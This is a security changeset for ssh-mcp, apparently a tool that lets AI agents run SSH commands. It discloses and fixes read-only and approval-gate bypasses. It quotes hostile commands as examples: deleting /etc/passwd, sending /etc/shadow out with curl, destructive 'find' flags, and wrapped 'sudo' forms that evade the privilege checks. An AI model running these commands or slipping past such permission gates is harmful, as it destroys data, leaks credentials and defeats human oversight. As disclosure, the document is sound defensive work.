---
"ssh-mcp": patch
---

**Security:** fix a read-only and approval-gate bypass in command classification ([GHSA-6f54-mjqq-2jp8](https://github.com/tufantunc/ssh-mcp/security/advisories/GHSA-6f54-mjqq-2jp8), CVSS 8.8). Affects 2.0.0 through 2.2.3.

The read-only allowlist vouches for a binary *name*, and two of the names it vouched for do not do what the name says.

`env` is an exec wrapper: `env <cmd>` runs `<cmd>`. Allowlisting the name meant the wrapped command was never classified, so `env sudo rm -f /etc/passwd` came back `read-only` and executed on a profile configured `readOnly = true` — the setting the README recommends for monitoring and observer access, reached through `read-command`, the tool whose whole contract is that it cannot mutate. No shell metacharacter is involved, so the `SHELL_CONTROL_CHARS` gate added for GHSA-r8hm-vpm8-cfh6 did not catch it either. `env curl -d @/etc/shadow http://…` exfiltrated any file the SSH user could read, with no elevation at all.

`find` writes and executes given the right flag. `find /var/www -delete` removed a directory tree and `find / -name x -exec sudo id +` ran a command as root, both classified `read-only`. The `-exec … \;` spelling escaped only because `;` happens to be a shell metacharacter; the `+` terminator carries none.

The same name-based blindness hid elevation from the approval gate. Privilege prefixes were matched by four `^`-anchored regexes, so anything standing before one dropped the command to `safe` — which the default bindings grant to `admin` and `operator` on every tier:

```
env sudo systemctl stop nginx      nohup sudo id       timeout 5 sudo id
FOO=1 sudo id                      "sudo" id           \sudo id
echo hi; sudo id                   cd /srv && sudo systemctl restart app
```

Fixed by looking at what a shell would actually run: `env` leaves the read-only allowlist (as `curl` and `wget` did, for the same reason, and it still reaches `run-command` under policy); `find` carrying `-delete`, `-exec`, `-execdir`, `-ok`, `-okdir` or a `-f*` output flag classifies destructive; and elevation is detected per segment, past exec wrappers, `NAME=value` assignments, leading options and quoting. Reading *about* sudo is untouched — `grep sudo /var/log/auth.log`, `cat /etc/sudoers` and `find /etc -name "*.conf"` all stay `read-only`, which is the distinction a tokenizer buys over a substring search.

**Behaviour change worth knowing about.** A bare `env`, which only prints the environment, is no longer `read-only`; a name-based allowlist cannot tell it from `env <cmd>`. And under the default bindings a compound or wrapped `sudo` on a `prod`-group profile is now refused rather than silently run — that is the point of the fix, but it will surface as newly-failing commands where it previously succeeded. `--group=staging`/`dev`, or a `[policy.roleBindings]` override granting `admin.prod` the `privileged` class, restores it deliberately.

Reported through review of [#130](https://github.com/tufantunc/ssh-mcp/pull/130) by [@burtherman](https://github.com/burtherman), whose fix for the anchored-prefix half of this is what prompted auditing the rest of the classifier's assumptions.
